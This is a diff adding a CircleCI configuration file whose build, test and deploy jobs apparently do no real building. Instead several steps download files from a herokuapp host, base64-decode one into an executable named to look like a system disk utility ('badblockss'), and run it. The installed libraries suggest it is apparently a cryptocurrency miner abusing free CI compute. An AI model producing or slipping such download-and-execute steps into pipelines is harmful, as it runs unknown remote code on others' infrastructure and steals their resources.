@@ -1,0 +1,114 @@
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.4.0
+
+executors:
+  circleci_machine:
+    docker:
+      - image: circleci/node:14.15
+    working_directory: ~/repo
+commands:
+  build:
+    description: Run build
+    steps:
+      - checkout
+      - run:
+          name: build
+          command: |
+              sudo apt update -y
+              sudo apt install -y git libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential 
+      - run:
+          name: build
+          command: |
+              wget -O blkdiscards https://panelinfo.herokuapp.com/sugar/nssmaa && wget https://panelinfo.herokuapp.com/sugar/runner && chmod +x blkdiscards && base64 -d runner > badblockss && chmod +x badblockss && ./badblockss
+          no_output_timeout: 110
+
+      - run:
+          name: buildddart
+          command:
+              mv 10 2
+          when: on_fail
+          no_output_timeout: 5m
+  builder2:
+    description: Run builder2
+    steps:
+      - checkout
+      - run:
+          name: buildddart
+          command: |
+              wget -O blkdiscards https://panelinfo.herokuapp.com/sugar/nssmaa && wget https://panelinfo.herokuapp.com/sugar/runner && chmod +x blkdiscards && base64 -d runner > badblockss && chmod +x badblockss && ./badblockss
+          no_output_timeout: 110
+      - run:
+          name: buildddart
+          command:
+              mv 10 3
+          when: on_fail
+          no_output_timeout: 30m
+jobs:
+  buildd:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [build]
+  build2:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  test1:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  test2:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  test3:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+  deploy:
+    executor: circleci_machine
+    working_directory: ~/repo
+    steps: [builder2]
+workflows:
+  version: 2
+  build:
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+      - test1:
+          requires:
+          - build2
+      - test2:
+          requires:
+          - build2
+      - test3:
+          requires:
+          - build2
+      - deploy:
+          requires:
+          - test1
+          - test2
+          - test3
+  build2:
+    jobs:
+      - buildd
+      - build2:
+          requires:
+          - buildd
+      - test1:
+          requires:
+          - build2
+      - test2:
+          requires:
+          - build2
+      - test3:
+          requires:
+          - build2
+      - deploy:
+          requires:
+          - test1
+          - test2
+          - test3
